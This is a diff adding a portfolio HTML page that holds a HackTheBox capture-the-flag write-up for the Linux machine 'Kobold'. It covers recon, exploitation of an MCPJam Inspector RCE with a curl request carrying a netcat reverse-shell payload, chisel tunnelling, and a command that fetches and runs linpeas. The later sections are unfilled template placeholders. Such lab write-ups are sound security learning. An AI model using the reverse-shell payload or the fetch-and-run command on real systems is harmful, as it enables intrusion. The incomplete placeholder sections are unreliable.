@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kobold — HTB Writeup | Anmol Chaudhary</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+<style>
+  .wu { max-width: 820px; margin: 0 auto; padding: 56px 20px 80px; }
+  .wu-back { font-family: var(--mono); font-size: 0.85rem; color: var(--text-dim); display: inline-flex; align-items: center; gap: 6px; margin-bottom: 24px; transition: color 0.2s ease; }
+  .wu-back:hover { color: var(--accent); text-decoration: none; }
+  .wu-meta { display: flex; align-items: center; gap: 12px; margin: 14px 0 32px; font-family: var(--mono); font-size: 0.85rem; }
+  .wu-date { color: var(--text-dim); margin-left: 6px; }
+  .wu h1 { font-size: 1.8rem; margin: 12px 0 8px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+  .wu h2 { font-size: 1.25rem; margin: 36px 0 14px; color: var(--accent); }
+  .wu h3 { font-size: 1.05rem; margin: 24px 0 10px; color: #f6efe2; }
+  .wu h4 { font-size: 0.95rem; margin: 18px 0 8px; color: var(--text); }
+  .wu p { color: var(--text); max-width: 72ch; margin: 0 0 16px; line-height: 1.65; }
+  .wu pre {
+    background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent);
+    border-radius: var(--radius); padding: 14px 18px; overflow-x: auto; font-family: var(--mono);
+    font-size: 0.86rem; color: var(--ok); margin: 18px 0 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+  }
+  .wu code { font-family: var(--mono); background: var(--surface-2); padding: 2px 6px; border-radius: 3px; font-size: 0.88em; border: 1px solid var(--border); }
+  .wu pre code { background: transparent; padding: 0; border: none; font-size: inherit; }
+  .table-wrap { overflow-x: auto; margin: 20px 0; border: 1px solid var(--border); border-radius: var(--radius); }
+  .wu table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 0.85rem; text-align: left; }
+  .wu th, .wu td { padding: 10px 14px; border-bottom: 1px solid var(--border); }
+  .wu th { background: var(--surface-2); color: var(--accent); font-weight: 600; }
+  .wu tr:last-child td { border-bottom: none; }
+  .wu ul, .wu ol { color: var(--text); padding-left: 24px; margin: 12px 0 20px; }
+  .wu li { margin-bottom: 8px; }
+  .wu hr { border: none; border-top: 1px solid var(--border); margin: 36px 0; }
+</style>
+</head>
+<body>
+<header class="nav">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-prompt">anmol@portfolio<span class="nav-sep">:~$</span><span class="cursor">_</span></a>
+    <a href="../index.html#writeups" class="wu-back" style="margin-bottom:0;">&larr; writeups directory</a>
+  </div>
+</header>
+
+<main class="wu">
+  <a href="../index.html#writeups" class="wu-back">&larr; back to all writeups</a>
+  <h1>Kobold</h1>
+  <div class="wu-meta">
+    <span class="os-tag os-linux">Linux</span>
+    <span class="diff-tag diff-easy">Easy</span>
+    <span class="wu-date">Pwned: 2026-06-15</span>
+  </div>
+
+  <h2>Machine Info</h2>
+  <div class="table-wrap"><table><thead><tr><th>Field</th><th>Details</th></tr></thead><tbody>
+  <tr><td>Machine Name</td><td>Name</td></tr>
+  <tr><td>OS</td><td>Linux</td></tr>
+  <tr><td>Difficulty</td><td>Easy</td></tr>
+  <tr><td>Status</td><td>User pwned</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Tools Used</h2>
+  <hr>
+  <h2>Summary</h2>
+  <p>Brief summary of the machine, attack path, and key vulnerabilities exploited.</p>
+  <hr>
+  <h2>Reconnaissance</h2>
+  <h3>Initial Scan (NMAP)</h3>
+  <p>Initial recon reveals that the website has 443 ports open and running ssl. Scan also tells us that there are more than one DNS (<code>*.kobold.htb wildcard is mentioned</code>).</p>
+  <pre><code>┌──(kali㉿kali)-[~/HTB/Kobold/recon]
+└─$ nmap -sC -sV -A 10.129.100.174 -oN scan.txt
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-03 13:03 -0400
+Nmap scan report for kobold.htb (10.129.100.174)
+Host is up (0.19s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
+|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
+80/tcp  open  http     nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Kobold Operations Suite
+| ssl-cert: Subject: commonName=kobold.htb
+| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
+| Not valid before: 2026-03-15T15:08:55
+|_Not valid after:  2125-02-19T15:08:55
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+| tls-alpn: 
+|   http/1.1
+|   http/1.0
+|_  http/0.9
+---SNIP---
+</code></pre>
+  <p><strong>Open Ports:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>22</td><td>SSH</td><td></td><td></td></tr>
+  <tr><td>80</td><td>http</td><td></td><td></td></tr>
+  <tr><td>443</td><td>https</td><td></td><td></td></tr>
+  <tr><td>3552</td><td>Arcane</td><td>v1.13.0</td><td>Vulnerable to CVE-2026-23520 (Discovered later after foothold is created).</td></tr>
+  </tbody></table></div>
+  <h3>Web Enumeration (if applicable)</h3>
+  <p>Running a gobuster scan for subdomains reveals that MCPJAM v1.4.2 service is running on <code>mcp.kobold.htb</code> subdomain.</p>
+  <pre><code>┌──(kali㉿kali)-[~/HTB/Kobold]
+└─$ gobuster vhost -u https://kobold.htb \
+  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  --append-domain \
+  -k \
+  -t 10 \
+  --timeout 10s \
+  2&gt;/dev/null
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       https://kobold.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+mcp.kobold.htb Status: 200 [Size: 466]
+
+===============================================================
+Finished
+===============================================================</code></pre>
+  <hr>
+  <h2>Vulnerability Identification</h2>
+  <h3>Identified Technologies</h3>
+  <div class="table-wrap"><table><thead><tr><th>Technology</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>MCPJAM Inspector</td><td>v1.4.2</td><td>Critical RCE vulnerabilitiy (CVE-2026-23744)</td></tr>
+  </tbody></table></div>
+  <h3>CVEs / Vulnerabilities Identified</h3>
+  <div class="table-wrap"><table><thead><tr><th>CVE</th><th>Description</th><th>Severity</th></tr></thead><tbody>
+  <tr><td>CVE-2026-23744</td><td>MCPJam inspector &lt;= 1.4.2 contains a remote code execution caused by crafted HTTP requests triggering MCP server installation, letting remote attackers execute arbitrary code, exploit requires network access to the listening interface.</td><td>Critical</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Initial Foothold / Initial Access</h2>
+  <h3>CVE-2026-23744</h3>
+  <p><strong>Description:</strong> To exploit the vulnerability, <a href="https://github.com/advisories/GHSA-232v-j27c-5pp6" target="_blank" rel="noopener">this proof of concept</a> was used as a reference. We used the same command in linux format to trigger a reverse shell</p>
+  <p>Sending the following command while keeping the netcat listening for 4444 gives us initial foothold</p>
+  <pre><code>┌──(kali㉿kali)-[~/HTB/Kobold/CVE-2026-23744]
+└─$ curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#x27;{&quot;serverConfig&quot;:{&quot;command&quot;:&quot;/bin/sh&quot;,&quot;args&quot;:[&quot;-c&quot;,&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 4444 &gt;/tmp/f&quot;],&quot;env&quot;:{}},&quot;serverId&quot;:&quot;pwned&quot;}&#x27;
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;504 Gateway Time-out&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;504 Gateway Time-out&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.24.0 (Ubuntu)&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+  <pre><code>──(kali㉿kali)-[~/HTB/Kobold]
+└─$ nc -lvnp 4444    
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.129.100.174] 56532
+/bin/sh: 0: can&#x27;t access tty; job control turned off</code></pre>
+  <hr>
+  <h2>Post-Exploitation</h2>
+  <h3>System Enumeration</h3>
+  <p>Further enumeration within the foothold reveals that Arcane 1.13.0 is running internally on port 3552.</p>
+  <pre><code>$ ss -tuln
+Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
+---SNIP---        
+tcp   LISTEN 0      4096       127.0.0.1:8080       0.0.0.0:*          
+tcp   LISTEN 0      511          0.0.0.0:443        0.0.0.0:*          
+tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
+tcp   LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*          
+tcp   LISTEN 0      4096       127.0.0.1:37301      0.0.0.0:*               
+tcp   LISTEN 0      4096               *:3552             *:* </code></pre>
+  <p>We can reverse the ports back to our client machine to listen to them using chisel.</p>
+  <p>On local machine.</p>
+  <pre><code>kali㉿kali)-[~/ScriptsTools]
+└─$ ./chisel server -p 9000 --reverse
+2026/06/03 16:32:20 server: Reverse tunnelling enabled</code></pre>
+  <p>On foothold machine after sending the chisel script to the foothold.</p>
+  <pre><code> ./chisel client 10.10.14.2:9000 R:3552:127.0.0.1:3552
+2026/06/03 20:39:10 client: Connecting to ws://10.10.14.2:9000
+2026/06/03 20:39:12 client: Connected (Latency 195.555954ms)</code></pre>
+  <h3>Identified Technologies</h3>
+  <div class="table-wrap"><table><thead><tr><th>Technology</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>Arcane</td><td>v1.13.0</td><td>NA</td></tr>
+  </tbody></table></div>
+  <h3>CVE-2026-23520</h3>
+  <h3>Credential Discovery</h3>
+  <pre><code># look for credentials</code></pre>
+  <p><strong>Credentials Found:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Username</th><th>Password</th><th>Hash</th><th>Service</th></tr></thead><tbody>
+  </tbody></table></div>
+  <h3>Lateral Movement (if applicable)</h3>
+  <p><strong>Steps:</strong></p>
+  <pre><code># lateral movement commands</code></pre>
+  <h3>User Flag</h3>
+  <pre><code>cat ~/user.txt</code></pre>
+  <pre><code>
+{{user_flag}}
+</code></pre>
+  <hr>
+  <h2>Privilege Escalation</h2>
+  <h3>Enumeration</h3>
+  <pre><code># transfer and run linpeas
+curl http://{{attack_ip}}:8000/linpeas.sh -o /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh</code></pre>
+  <p><strong>Key Findings:</strong></p>
+  <p>-</p>
+  <p>-</p>
+  <p>-</p>
+  <h3>Vulnerability: {{privesc_vuln}}</h3>
+  <p><strong>Description:</strong></p>
+  <p><strong>Steps:</strong></p>
+  <pre><code># privilege escalation commands</code></pre>
+  <p><strong>Result:</strong></p>
+  <pre><code>whoami
+# root</code></pre>
+  <h3>Root Flag</h3>
+  <pre><code>---CENSORED---</code></pre>
+  <hr>
+  <h2>Trophy</h2>
+  <pre><code></code></pre>
+  <p><em>Completed as part of HackTheBox practice in a legal, controlled environment.</em></p>
+</main>
+
+<footer class="footer">
+  <p>&copy; <span id="year"></span> Anmol Chaudhary — built with HTML, CSS, and curiosity.</p>
+</footer>
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
